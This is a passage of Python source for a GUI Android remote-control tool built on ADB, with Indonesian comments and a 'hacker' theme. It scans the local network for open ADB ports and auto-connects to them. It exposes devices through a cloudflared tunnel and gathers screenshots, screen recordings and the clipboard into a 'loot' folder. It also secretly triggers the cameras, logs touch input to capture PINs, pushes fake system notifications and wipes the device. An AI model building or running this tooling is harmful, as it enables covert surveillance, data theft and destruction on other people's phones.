        # --- Mulai update status ---
        self.update_status_loop()
        self._start_auto_reconnect_loop()
        self.after(500, self.refresh_loot_panel)

    def _on_window_resize(self, event=None):
        """Menjaga panel perangkat tetap rapi saat ukuran window berubah."""
        try:
            if hasattr(self, "device_panel"):
                self.device_panel.grid_columnconfigure(0, weight=1)
                self.device_info_label.configure(wraplength=max(180, min(240, self.sidebar_frame.winfo_width() - 50)))
        except Exception:
            pass

    def on_device_select(self, selected_serial):
        """Dipanggil saat pengguna memilih perangkat dari dropdown."""
        self.set_active_device(selected_serial)
        self.update_status_loop()

    def load_config(self):
        """Memuat konfigurasi dari file JSON."""
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        return {}

    def save_config(self):
        """Menyimpan konfigurasi ke file JSON."""
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)
        self.log("Konfigurasi disimpan.")

    def set_active_device(self, serial):
        self.active_device_serial = serial
        if serial in self.connected_devices:
            self.device_selector_var.set(serial)
            self.log(f"Perangkat aktif diatur ke: {serial}")
        elif serial is None:
            self.device_selector_var.set("[ Tidak ada perangkat ]")
            self.device_info_label.configure(text="Detail:\n-")

    def log(self, message):
        """Menambahkan pesan ke textbox log di thread yang aman."""
        self.log_textbox.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")
        self.log_textbox.see("end")

    def refresh_loot_panel(self):
        """Memuat ulang daftar file hasil download dari folder ADB_LOOT ke GUI."""
        try:
            self.loot_file_paths = []
            self.loot_listbox.delete(0, tkinter.END)

            if not os.path.exists(LOOT_DIR):
                self.loot_listbox.insert(tkinter.END, "[ Folder ADB_LOOT belum dibuat ]")
                self.loot_preview.delete("0.0", "end")
                self.loot_preview.insert("0.0", "Folder ADB_LOOT belum tersedia.\n")
                return

            all_files = []
            for root, _, files in os.walk(LOOT_DIR):
                for filename in files:
                    full_path = os.path.join(root, filename)
                    rel_path = os.path.relpath(full_path, LOOT_DIR)
                    try:
                        size = os.path.getsize(full_path)
                    except OSError:
                        size = 0
                    all_files.append((rel_path, full_path, size))

            all_files.sort(key=lambda item: item[0].lower())

            if not all_files:
                self.loot_listbox.insert(tkinter.END, "[ Belum ada hasil download di ADB_LOOT ]")
                self.loot_preview.delete("0.0", "end")
                self.loot_preview.insert("0.0", "Belum ada file hasil download yang tersimpan.\n")
                return

            for rel_path, full_path, size in all_files:
                self.loot_file_paths.append(full_path)
                self.loot_listbox.insert(tkinter.END, f"{rel_path}  [{size} bytes]")

        except Exception as e:
            self.log(f"Error saat refresh panel ADB_LOOT: {e}")

    def on_loot_file_select(self, event=None):
        """Menampilkan pratinjau konten file yang dipilih dari ADB_LOOT."""
        try:
            selected_indexes = self.loot_listbox.curselection()
            if not selected_indexes:
                return

            selected_index = selected_indexes[0]
            if selected_index >= len(self.loot_file_paths):
                return

            selected_path = self.loot_file_paths[selected_index]
            self.loot_preview.delete("0.0", "end")

            if not os.path.exists(selected_path):
                self.loot_preview.insert("0.0", "File tidak ditemukan.\n")
                return

            ext = os.path.splitext(selected_path)[1].lower()
            text_exts = {".txt", ".json", ".xml", ".log", ".csv", ".ini", ".cfg", ".sh", ".py", ".html", ".md", ".bat"}
            image_exts = {".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp"}
            video_exts = {".mp4", ".mkv", ".avi", ".mov", ".wmv", ".3gp", ".mpeg", ".mpg"}

            if ext in text_exts:
                with open(selected_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(3000)
                self.loot_preview.insert("0.0", content)
            elif ext in image_exts:
                self.loot_preview.insert("0.0", f"Gambar terdeteksi: {selected_path}\n\nKlik 'Buka Gambar/Video' atau double-click pada item untuk menampilkan/menjalankan file.")
            elif ext in video_exts:
                self.loot_preview.insert("0.0", f"Video terdeteksi: {selected_path}\n\nKlik 'Buka Gambar/Video' atau double-click pada item untuk memutar video.")
            else:
                self.loot_preview.insert("0.0", f"Pratinjau untuk format {ext or 'tidak dikenal'} tidak tersedia.\n\nFile: {selected_path}\n")
        except Exception as e:
            self.loot_preview.delete("0.0", "end")
            self.loot_preview.insert("0.0", f"Error membaca preview: {e}\n")

    def start_loading(self, message="Eksekusi Perintah..."):
        """Menampilkan popup progress bar di tengah GUI saat perintah ADB berjalan."""
        self.loading_busy = True
        self.loading_popup_label.configure(text=message)
        self._show_loading_popup()
        self.loading_progressbar.start()

    def _show_loading_popup(self):
        try:
            self.update_idletasks()
            parent_x = self.winfo_rootx()
            parent_y = self.winfo_rooty()
            parent_w = self.winfo_width()
            parent_h = self.winfo_height()
            popup_w = 320
            popup_h = 90
            center_x = parent_x + int(parent_w / 2 - popup_w / 2)
            center_y = parent_y + int(parent_h / 2 - popup_h / 2)
            self.loading_popup.geometry(f"{popup_w}x{popup_h}+{center_x}+{center_y}")
            self.loading_popup.deiconify()
        except Exception:
            pass

    def stop_loading(self):
        """Menutup popup progress bar loading."""
        self.loading_busy = False
        if self.loading_animation_id is not None:
            self.after_cancel(self.loading_animation_id)
            self.loading_animation_id = None
        self.loading_progressbar.stop()
        self.loading_popup.withdraw()

    def open_loot_folder(self):
        """Menampilkan panel ADB_LOOT Explorer hanya saat tombol sidebar ditekan."""
        try:
            os.makedirs(LOOT_DIR, exist_ok=True)
            if self.loot_frame.winfo_ismapped():
                self.loot_frame.grid_remove()
                self.log("Menutup panel ADB_LOOT Explorer.")
            else:
                self.loot_frame.grid()
                self.refresh_loot_panel()
                self.log(f"Menampilkan panel ADB_LOOT Explorer: {LOOT_DIR}")
        except Exception as e:
            self.log(f"Gagal membuka panel ADB_LOOT: {e}")

    def open_selected_loot_file(self):
        """Membuka file hasil yang saat ini dipilih pada aplikasi default sistem."""
        try:
            selected_indexes = self.loot_listbox.curselection()
            if not selected_indexes:
                self.log("Pilih salah satu file dari ADB_LOOT terlebih dahulu.")
                return

            selected_path = self.loot_file_paths[selected_indexes[0]]
            if os.name == 'nt':
                os.startfile(selected_path)
            else:
                webbrowser.open(f"file://{selected_path}")
            self.log(f"Membuka file hasil: {selected_path}")
        except Exception as e:
            self.log(f"Gagal membuka file hasil: {e}")

    def run_command_in_thread(self, command, save_to_file=None, callback=None):
        """Menjalankan perintah ADB di thread terpisah agar GUI tidak freeze."""
        self.after(0, self.start_loading, "Eksekusi Perintah...")
        thread = threading.Thread(target=self._execute_adb, args=(command, save_to_file, callback))
        thread.daemon = True
        thread.start()

    def _execute_adb(self, command, save_to_file=None, callback=None):
        """Fungsi internal yang menjalankan subprocess."""
        self.after(0, self.log, f"Meminta: {command}")

        adb_prefix = "adb"
        # Perintah yang tidak memerlukan penargetan perangkat spesifik
        unscoped_commands = ["connect", "pair", "kill-server", "start-server", "devices"]
        if self.active_device_serial and not any(command.strip().startswith(uc) for uc in unscoped_commands):
            adb_prefix = f"adb -s {self.active_device_serial}"

        try:
            # Menentukan path loot
            loot_path = self.get_loot_path()
            # Menyesuaikan command untuk pull
            if command.startswith("pull"):
                parts = command.split()
                remote_path = parts[1]
                local_name = parts[2].strip('"')
                local_path = os.path.join(loot_path, local_name)
                # os.makedirs(local_path, exist_ok=True) # Pull will create the final dir
                final_command = f'{adb_prefix} pull {remote_path} "{local_path}"'
            elif command.startswith("install"):
                # Perintah install sudah memiliki path absolut, tidak perlu modifikasi
                final_command = f"{adb_prefix} {command}"
            else:
                final_command = f"{adb_prefix} {command}"

            process = subprocess.run(final_command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            
            if process.returncode == 0:
                self.after(0, self.log, f"Perintah '{command.split()[0]}' berhasil.")
                output = process.stdout
                if save_to_file:
                    file_path = os.path.join(loot_path, save_to_file)
                    with open(file_path, "w", encoding='utf-8') as f:
                        f.write(output)
                    self.after(0, self.log, f"Output disimpan ke: {file_path}")
                self.after(0, self.refresh_loot_panel)
                if callback:
                    self.after(0, callback, output) # Menjalankan callback di main thread
            else:
                self.after(0, self.log, f"Error: {process.stderr.strip()}")
        except Exception as e:
            self.after(0, self.log, f"Exception saat menjalankan perintah: {e}")
        finally:
            self.after(0, self.stop_loading)

    def get_loot_path(self):
        """Mendapatkan path folder loot berdasarkan perangkat aktif."""
        if self.active_device_serial and self.active_device_serial in self.connected_devices:
            model_text = self.connected_devices[self.active_device_serial].get("model", "UNKNOWN_DEVICE")
            dir_name = f"{model_text.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d')}"
            path = os.path.join(LOOT_DIR, dir_name)
            os.makedirs(path, exist_ok=True)
            return path
        return LOOT_DIR # Default path

    def update_status_loop(self):
        """Memeriksa status perangkat secara berkala."""
        def check_status():
            try:
                devices_output = subprocess.run("adb devices", shell=True, capture_output=True, text=True, timeout=5).stdout
                current_serials = [line.split('\t')[0] for line in devices_output.strip().split('\n')[1:] if '\tdevice' in line]

                # Deteksi perangkat USB baru
                for serial in current_serials:
                    if serial not in self.connected_devices and ":" not in serial:
                        self.after(0, self.log, f"Perangkat USB baru terdeteksi: {serial}")
                        self.after(0, self.log, "Mengaktifkan mode TCP/IP secara otomatis...")
                        # Set sebagai aktif sementara untuk menjalankan switch
                        self.set_active_device(serial)
                        self.after(1000, self.switch_to_tcp)

                # Update daftar perangkat
                self.connected_devices = {serial: self.connected_devices.get(serial, {}) for serial in current_serials}

                # Update UI
                if not self.connected_devices:
                    self.after(0, lambda: self.device_selector_menu.configure(values=["[ Tidak ada perangkat ]"]))
                    self.after(0, lambda: self.set_active_device(None))
                else:
                    device_list = list(self.connected_devices.keys())
                    self.after(0, lambda: self.device_selector_menu.configure(values=device_list))
                    # Jika perangkat aktif saat ini hilang, pilih yang pertama
                    if self.active_device_serial not in self.connected_devices:
                        self.after(0, lambda: self.set_active_device(device_list[0]))

                # Ambil detail untuk perangkat yang aktif
                if self.active_device_serial and self.active_device_serial in self.connected_devices:
                    serial = self.active_device_serial
                    adb_prefix = f"adb -s {serial}"
                    try:
                        manufacturer = subprocess.run(f"{adb_prefix} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True, timeout=5).stdout.strip().capitalize()
                        model = subprocess.run(f"{adb_prefix} shell getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
                        android_ver = subprocess.run(f"{adb_prefix} shell getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
                        batt_raw = subprocess.run(f"{adb_prefix} shell dumpsys battery", shell=True, capture_output=True, text=True, timeout=5).stdout
                        batt_level = next((line.split(':')[1].strip() for line in batt_raw.splitlines() if "level" in line), "N/A")
                    except subprocess.TimeoutExpired:
                        manufacturer = self.connected_devices[serial].get("manufacturer", "UNKNOWN")
                        model = self.connected_devices[serial].get("model", "UNKNOWN")
                        android_ver = self.connected_devices[serial].get("android", "N/A")
                        batt_level = self.connected_devices[serial].get("battery", "N/A")
                    
                    self.connected_devices[serial] = {"manufacturer": manufacturer, "model": model, "android": android_ver, "battery": batt_level}
                    
                    info_text = f"Pabrikan: {manufacturer}\nModel: {model}\nAndroid: {android_ver}\nBaterai: {batt_level}%"
                    self.after(0, lambda: self.device_info_label.configure(text=info_text, text_color=HACKER_THEME["text_green"]))
                else:
                    self.after(0, lambda: self.device_info_label.configure(text="Detail:\n-", text_color="gray70"))

            except Exception as e:
                self.after(0, lambda: self.device_selector_menu.configure(values=["[ ADB ERROR ]"]))
                self.after(0, lambda: self.set_active_device(None))
            
            self.after(8000, self.update_status_loop) # Cek lagi setelah 8 detik

        threading.Thread(target=check_status, daemon=True).start()

    def on_closing(self):
        """Handle cleanup when the app is closed."""
        if self.cloudflared_process:
            self.log("Menghentikan proses cloudflared tunnel...")
            self.cloudflared_process.terminate()
        self.destroy()
    # --- FUNGSI TOMBOL SPESIFIK ---

    def activate_tunnel_server(self):
        """
        Menjalankan server tunnel (cloudflared) dari dalam GUI.
        Ini akan membuat endpoint publik di PC ini.
        """
        if self.cloudflared_process:
            self.log("Server tunnel sudah berjalan. Hentikan aplikasi untuk mematikannya.")
            return

        self.log("🚀 Mengaktifkan Server Tunnel di PC ini...")
        self.log("Pastikan 'cloudflared' terinstal dan Anda sudah login.")
        self.log("Di HP target, jalankan 'adb reverse tcp:5555 tcp:5555' via USB.")

        thread = threading.Thread(target=self._execute_tunnel_server)
        thread.daemon = True
        thread.start()

    def _execute_tunnel_server(self):
        """Fungsi thread untuk menjalankan cloudflared sebagai server."""
        try:
            command = ["cloudflared", "tunnel", "--url", "tcp://localhost:5555"]
            self.cloudflared_process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )

            self.after(0, self.log, "Server tunnel dimulai. Menunggu alamat publik...")
            for line in iter(self.cloudflared_process.stdout.readline, ''):
                line = line.strip()
                self.after(0, self.log, f"[Server] {line}")
                match = re.search(r"([a-zA-Z0-9-]+\.trycloudflare\.com)", line)
                if match:
                    found_url = match.group(1)
                    try:
                        pyperclip = importlib.import_module("pyperclip")
                        pyperclip.copy(found_url)
                        self.after(0, self.log, f"✅ Server Tunnel Aktif & Disalin ke Clipboard: {found_url}")
                    except (ImportError, Exception):
                        self.after(0, self.log, f"✅ Server Tunnel Aktif di: {found_url}")
                        self.after(0, self.log, "(Install 'pyperclip' untuk menyalin otomatis ke clipboard)")
        except Exception as e:
            self.after(0, self.log, f"❌ Gagal memulai server tunnel: {e}")

    def switch_to_tcp(self):
        """
        Memulai proses untuk beralih dari koneksi USB ke TCP/IP.
        Proses ini akan berjalan di thread terpisah.
        """
        if not self.active_device_serial or ":" in self.active_device_serial:
            self.log("Error: Hubungkan perangkat via USB terlebih dahulu untuk menggunakan fitur ini.")
            return

        self.log("Memulai proses switch ke TCP/IP...")
        thread = threading.Thread(target=self._execute_switch_to_tcp, args=(self.active_device_serial,))
        thread.daemon = True
        thread.start()

    def _execute_switch_to_tcp(self, usb_serial):
        """Fungsi yang berjalan di thread untuk menangani logika switch ke TCP/IP."""
        try:
            # 1. Dapatkan alamat IP perangkat
            self.after(0, self.log, f"Mendapatkan alamat IP dari {usb_serial}...")
            ip_command = f"adb -s {usb_serial} shell ip addr show wlan0"
            process = subprocess.run(ip_command, shell=True, capture_output=True, text=True, timeout=5)
            
            if process.returncode != 0:
                self.after(0, self.log, "Gagal mendapatkan alamat IP. Pastikan perangkat terhubung ke WiFi.")
                return

            match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", process.stdout)
            if not match:
                self.after(0, self.log, "Alamat IP tidak ditemukan di output. Pastikan WiFi aktif.")
                return
            
            device_ip = match.group(1)
            self.after(0, self.log, f"Alamat IP perangkat ditemukan: {device_ip}")

            # 2. Aktifkan mode TCP/IP di port 5555
            subprocess.run(f"adb -s {usb_serial} tcpip 5555", shell=True, capture_output=True, timeout=5)
            self.after(0, self.log, "Mode TCP/IP di port 5555 telah diaktifkan. Menunggu sejenak...")
            time.sleep(2)

            # 3. Hubungkan ke perangkat melalui IP
            target_serial = f"{device_ip}:5555"
            self.after(0, self.log, f"Menyambungkan ke {target_serial}...")
            self.run_command_in_thread(f"connect {target_serial}", callback=lambda out: self.set_active_device(target_serial))
            self.after(0, self.log, "Proses selesai. Anda sekarang dapat mencabut kabel USB.")

        except Exception as e:
            self.after(0, self.log, f"Terjadi kesalahan saat proses switch: {e}")

    def connect_via_flask(self):
        """Meminta alamat server relay Flask dan menghubungkan ADB ke sana."""
        self.log("Fitur ini memerlukan server relay Flask yang berjalan di VPS.")
        dialog = CustomInputDialog(self, title="Connect via Flask Relay", text="Masukkan IP server Flask (cth: 123.45.67.89):", theme=HACKER_THEME)
        server_ip = dialog.get_input()
        if server_ip:
            target_serial = f"{server_ip}:5555" # Asumsi relay berjalan di port 5555
            self.set_active_device(target_serial)
            self.run_command_in_thread(f"connect {target_serial}")

    def auto_create_tunnel(self):
        """
        Secara otomatis membuat Cloudflared tunnel dan menghubungkan ADB.
        Memerlukan `cloudflared` terinstal dan sudah login.
        """
        if self.cloudflared_process:
            self.log("Tunnel sudah berjalan. Hentikan dulu jika ingin membuat yang baru.")
            return

        self.log("Memulai proses auto-create tunnel Cloudflared...")
        thread = threading.Thread(target=self._execute_auto_tunnel)
        thread.daemon = True
        thread.start()

    def _execute_auto_tunnel(self):
        """Fungsi thread untuk menjalankan dan memantau cloudflared."""
        self.after(0, self.log, "Asumsi: 'cloudflared' sudah terinstal dan Anda sudah login.")
        try:
            # Gunakan Popen untuk menjalankan proses di latar belakang dan membaca outputnya
            self.cloudflared_process = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", "tcp://localhost:5555"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )

            self.after(0, self.log, "Proses cloudflared dimulai. Menunggu alamat tunnel...")

            for line in iter(self.cloudflared_process.stdout.readline, ''):
                self.after(0, self.log, f"[cf] {line.strip()}")
                match = re.search(r"([a-zA-Z0-9-]+\.trycloudflare\.com)", line)
                if match:
                    tunnel_address = match.group(1)
                    self.after(0, self.log, f"✅ Alamat tunnel baru ditemukan: {tunnel_address}")
                    # Secara otomatis menyimpan alamat baru ke konfigurasi
                    self.config["locked_cloudflare_tunnel"] = tunnel_address
                    self.save_config()
                    self.after(0, self.log, "Alamat baru telah disimpan ke config.json.")
                    self.after(0, self.connect_via_cloudflared_auto, tunnel_address)
                    break # Berhenti memantau setelah alamat ditemukan
        except FileNotFoundError:
            self.after(0, self.log, "Error: Perintah 'cloudflared' tidak ditemukan. Pastikan sudah terinstal dan ada di PATH sistem Anda.")
            self.cloudflared_process = None
        except Exception as e:
            self.after(0, self.log, f"Error saat menjalankan cloudflared: {e}")
            self.cloudflared_process = None

    def scan_network(self):
        """Memulai pemindaian jaringan untuk perangkat ADB di thread terpisah."""
        self.log("🚀 Memulai scan jaringan untuk perangkat ADB...")
        thread = threading.Thread(target=self._execute_network_scan)
        thread.daemon = True
        thread.start()

    def _execute_network_scan(self):
        """Fungsi yang berjalan di thread untuk memindai jaringan."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
        except Exception:
            self.after(0, self.log, "❌ Error: Tidak dapat mendeteksi IP lokal. Pastikan terhubung ke jaringan.")
            return

        self.after(0, self.log, f"IP Lokal Anda: {local_ip}. Memulai pemindaian port 5555...")
        ip_prefix = ".".join(local_ip.split('.')[:-1])
        port = 5555
        candidates = []

        def check_port(ip):
            """Mencoba koneksi socket cepat ke port."""
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(0.5)  # Timeout sangat singkat
                    if sock.connect_ex((ip, port)) == 0:
                        candidates.append(ip)
            except Exception:
                pass

        # Fase 1: Pemindaian Port Cepat menggunakan ThreadPool
        with ThreadPoolExecutor(max_workers=50) as executor:
            ips_to_scan = [f"{ip_prefix}.{i}" for i in range(1, 255)]
            executor.map(check_port, ips_to_scan)

        if not candidates:
            self.after(0, self.log, "Scan selesai. Tidak ada perangkat dengan port 5555 terbuka ditemukan.")
            return

        self.after(0, self.log, f"Ditemukan {len(candidates)} kandidat. Mencoba menghubungkan ADB...")
        
        # Fase 2: Koneksi Tertarget ke kandidat yang ditemukan
        def connect_candidate(ip):
            target = f"{ip}:{port}"
            try:
                proc = subprocess.run(f"adb connect {target}", shell=True, capture_output=True, text=True, timeout=2)
                output = proc.stdout.strip()
                if "connected to" in output or "already connected" in output:
                    self.after(0, self.log, f"✅ Perangkat ditemukan di: {ip}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(connect_candidate, candidates)

        self.after(0, self.log, "Scan jaringan selesai.")

    def connect_to_ip(self):
        dialog = CustomInputDialog(self, title="Connect to IP (Direct)", text="Masukkan IP perangkat (cth: 192.168.1.5):", theme=HACKER_THEME)
        ip = dialog.get_input()
        if ip:
            # Langsung set perangkat aktif dan coba hubungkan
            target_serial = f"{ip}:5555"
            self.set_active_device(target_serial)
            self.run_command_in_thread(f"connect {target_serial}")

    def connect_via_cloudflared_auto(self, tunnel_address):
        """Helper function to connect from the auto-tunnel thread."""
        self.set_active_device(tunnel_address)
        self.run_command_in_thread(f"connect {tunnel_address}")

    def manual_pairing(self):
        dialog = PairingDialog(self, theme=HACKER_THEME)
        inputs = dialog.get_inputs()
        if inputs and all(inputs.values()):
            thread = threading.Thread(target=self._execute_pairing, args=(inputs,))
            thread.daemon = True
            thread.start()
        elif inputs is not None:
            self.log("Pairing dibatalkan: Semua field harus diisi.")

    def _execute_pairing(self, pair_info):
        ip, pport, pcode, dport = pair_info["ip"], pair_info["pport"], pair_info["pcode"], pair_info["dport"]
        
        self.after(0, self.log, f"Mencoba pairing ke {ip}:{pport}...")
        try:
            pair_process = subprocess.run(f"adb pair {ip}:{pport}", shell=True, capture_output=True, text=True, input=pcode, encoding='utf-8', errors='ignore', timeout=15)
            if pair_process.returncode == 0 and "Successfully paired" in pair_process.stdout:
                self.after(0, self.log, f"Pairing berhasil: {pair_process.stdout.strip()}")
                self.after(0, self.log, f"Mencoba koneksi ke {ip}:{dport}...")
                target_serial = f"{ip}:{dport}"
                connect_process = subprocess.run(f"adb connect {target_serial}", shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=10)
                if connect_process.returncode == 0 and ("connected" in connect_process.stdout or "already connected" in connect_process.stdout):
                    self.after(0, self.log, f"Koneksi berhasil: {connect_process.stdout.strip()}")
                    self.after(0, self.set_active_device, target_serial) # Set perangkat aktif setelah konek
                else:
                    self.after(0, self.log, f"Koneksi GAGAL: {connect_process.stderr.strip() or connect_process.stdout.strip()}")
            else:
                self.after(0, self.log, f"Pairing GAGAL: {pair_process.stderr.strip() or pair_process.stdout.strip()}")
        except subprocess.TimeoutExpired:
            self.after(0, self.log, "Error: Proses pairing/connect timeout.")
        except Exception as e:
            self.after(0, self.log, f"Exception saat pairing: {e}")

    def get_clipboard(self):
        def show_clipboard(content):
            parsed_content = ''.join(c for c in content if c.isprintable()).split("'")[1].replace('\\n', '\n') if content else "Gagal membaca clipboard."
            
            dialog = customtkinter.CTkToplevel(self)
            dialog.title("Isi Clipboard")

            # Center the dialog over the main window
            dialog_width = 400
            dialog_height = 300
            main_app_x = self.winfo_x()
            main_app_y = self.winfo_y()
            main_app_width = self.winfo_width()
            main_app_height = self.winfo_height()
            center_x = main_app_x + int(main_app_width/2 - dialog_width/2)
            center_y = main_app_y + int(main_app_height/2 - dialog_height/2)
            dialog.geometry(f"{dialog_width}x{dialog_height}+{center_x}+{center_y}")

            textbox = customtkinter.CTkTextbox(dialog)
            textbox.pack(expand=True, fill="both", padx=10, pady=10)
            textbox.insert("0.0", parsed_content)
            textbox.configure(state="disabled")
            dialog.transient(self)
            dialog.grab_set()

        self.run_command_in_thread("shell service call clipboard 2", callback=show_clipboard)

    def take_screenshot(self):
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        remote_path = "/sdcard/screenshot.png"
        self.run_command_in_thread(f'shell screencap -p {remote_path}')
        # Tunggu sebentar agar file selesai dibuat di perangkat
        self.after(1000, lambda: self.run_command_in_thread(f'pull {remote_path} "screenshot_{ts}.png"'))

    def take_screenrecord(self):
        self.log("Mulai merekam layar selama 15 detik...")
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        remote_path = "/sdcard/screenrecord.mp4"
        self.run_command_in_thread(f'shell screenrecord --time-limit 15 {remote_path}')
        # Tunggu 16 detik sebelum pull
        self.after(16000, lambda: self.run_command_in_thread(f'pull {remote_path} "screenrecord_{ts}.mp4"'))

    def type_text(self):
        dialog = CustomInputDialog(self, title="Injeksi Keyboard", text="Masukkan teks yang akan diketik:", theme=HACKER_THEME)
        text = dialog.get_input()
        if text:
            escaped_text = text.replace(" ", "%s")
            self.run_command_in_thread(f'shell input text "{escaped_text}"')

    def open_url(self):
        dialog = CustomInputDialog(self, title="Buka Link", text="Masukkan URL lengkap:", theme=HACKER_THEME)
        url = dialog.get_input()
        if url:
            self.run_command_in_thread(f'shell am start -a android.intent.action.VIEW -d "{url}"')

    def open_maps_location(self):
        dialog = CustomInputDialog(self, title="Buka Lokasi Maps", text="Masukkan Latitude,Longitude (cth: -6.200000,106.816666):", theme=HACKER_THEME)
        loc = dialog.get_input()
        if loc:
            self.run_command_in_thread(f'shell am start -a android.intent.action.VIEW -d "geo:{loc}"')

    def send_whatsapp_message(self):
        dialog = WhatsAppDialog(self, theme=HACKER_THEME)
        inputs = dialog.get_inputs()
        if inputs and inputs["nomor"] and inputs["pesan"]:
            nomor = inputs["nomor"]
            pesan = inputs["pesan"].replace(" ", "%20")
            self.run_command_in_thread(f'shell am start -a android.intent.action.VIEW -d "https://wa.me/{nomor}?text={pesan}"')

    def play_music_from_url(self):
        dialog = CustomInputDialog(self, title="Putar Musik dari URL", text="Masukkan URL file audio:", theme=HACKER_THEME)
        url = dialog.get_input()
        if url:
            self.run_command_in_thread(f'shell am start -a android.intent.action.VIEW -d "{url}" -t "audio/*"')

    def open_youtube_video(self):
        dialog = CustomInputDialog(self, title="Buka Video YouTube", text="Masukkan Video ID YouTube (cth: dQw4w9WgXcQ):", theme=HACKER_THEME)
        vid = dialog.get_input()
        if vid:
            self.run_command_in_thread(f'shell am start -a android.intent.action.VIEW "vnd.youtube:{vid}"')

    def send_fake_notification(self):
        dialog = CustomInputDialog(self, title="Kirim Notifikasi Palsu", text="Masukkan teks notifikasi:", theme=HACKER_THEME)
        text = dialog.get_input()
        if text:
            self.run_command_in_thread(f"shell cmd statusbar post-notification -t 'System Update' '{text}'")

    def _take_media(self, action, front_camera=True, is_video=False):
        self.log(f"Mencoba {'merekam video' if is_video else 'mengambil foto'}...")
        # Buka kamera
        self.run_command_in_thread(f"shell am start -a {action} --ez android.intent.extra.USE_FRONT_CAMERA {str(front_camera).lower()}")
        # Tunggu kamera siap lalu tekan tombol shutter/record
        self.after(2000, lambda: self.run_command_in_thread("shell input keyevent 27"))
        self.log("Perintah ambil media terkirim. Periksa galeri perangkat.")

    def take_photo_front(self):
        self._take_media("android.media.action.IMAGE_CAPTURE", front_camera=True)

    def take_photo_rear(self):
        self._take_media("android.media.action.IMAGE_CAPTURE", front_camera=False)

    def record_video_front(self):
        self._take_media("android.media.action.VIDEO_CAPTURE", front_camera=True, is_video=True)

    def record_video_rear(self):
        self._take_media("android.media.action.VIDEO_CAPTURE", front_camera=False, is_video=True)

    def record_pin(self):
        self.log("🔴 Merekam input sentuhan... Tekan CTRL+C di terminal untuk berhenti.")
        self.log("CATATAN: Fitur ini mungkin tidak berfungsi di semua perangkat/OS.")
        # Perintah ini akan berjalan terus, jadi kita jalankan di thread tanpa menunggu selesai.
        # Pengguna harus menghentikannya secara manual jika diperlukan.
        # Di GUI, ini sulit dihentikan, jadi ini hanya demonstrasi.
        self.run_command_in_thread("shell getevent -lt /dev/input/event2 > pin.log") # event2 adalah tebakan umum

    def replay_pin(self):
        self.log("🟢 Memutar ulang input sentuhan yang direkam...")
        self.log("CATATAN: Fitur ini sangat tidak bisa diandalkan dan hanya untuk eksperimen.")
        # Implementasi ini sangat disederhanakan dan kemungkinan besar tidak akan berfungsi.
        # Parsing file log dan mengirim event tap adalah hal yang kompleks.
        self.log("Fungsi Replay PIN belum diimplementasikan sepenuhnya di GUI ini.")

    def change_wallpaper(self):
        dialog = CustomInputDialog(self, title="Ganti Wallpaper", text="Masukkan URL gambar:", theme=HACKER_THEME)
        url = dialog.get_input()
        if url:
            self.run_command_in_thread(f'shell am start -a android.intent.action.ATTACH_DATA -d "{url}" -t "image/*"')
            self.log("Kirim intent untuk ganti wallpaper. Konfirmasi mungkin diperlukan di HP.")

    def push_and_play_mp3(self):
        try:
            from tkinter import filedialog
            filepath = filedialog.askopenfilename(title="Pilih file MP3", filetypes=[("MP3 files", "*.mp3")])
            if not filepath:
                self.log("Pemilihan file dibatalkan.")
                return
            
            remote_path = "/sdcard/ghost_sound.mp3"
            self.log(f"Mengirim {os.path.basename(filepath)} ke {remote_path}...")

            def play_sound(output):
                self.log("File berhasil dikirim. Memainkan suara...")
                self.run_command_in_thread(f'shell am start -a android.intent.action.VIEW -d "file://{remote_path}" -t "audio/mp3"')

            # Menggunakan adb push, bukan pull
            thread = threading.Thread(target=self._execute_adb, args=(f'push "{filepath}" {remote_path}', None, play_sound))
            thread.daemon = True
            thread.start()
        except Exception as e:
            self.log(f"Error saat memilih file: {e}")

    def play_alarm(self):
        self.log("Memainkan alarm dengan volume maksimal...")
        for _ in range(15):
            self.run_command_in_thread("shell input keyevent 24") # Volume Up
        self.run_command_in_thread("shell am start -a android.intent.action.VIEW -d content://settings/system/alarm_alert -t audio/*")

    def wipe_data(self):
        dialog = CustomInputDialog(self, title="PERINGATAN KERAS!", text="Ini akan MENGHAPUS SEMUA DATA.\nKetik 'YES' untuk konfirmasi:", theme=HACKER_THEME)
        confirmation = dialog.get_input()
        if confirmation == "YES":
            self.log("MENGIRIM PERINTAH WIPE DATA!")
            self.run_command_in_thread("shell am broadcast -a android.intent.action.MASTER_CLEAR")
        else:
            self.log("Operasi WIPE DATA dibatalkan.")

    def mirror_scrcpy(self):
        """Menjalankan Scrcpy dengan penanganan error path yang cerdas."""
        active_serial = self.active_device_serial
        if not active_serial:
            self.log("Error: Tidak ada perangkat aktif yang dipilih.")
            return
        
        thread = threading.Thread(target=self._execute_scrcpy, args=(active_serial,))
        thread.daemon = True
        thread.start()

    def _execute_scrcpy(self, active_serial):
        """Fungsi thread untuk menjalankan scrcpy dan menangani error."""
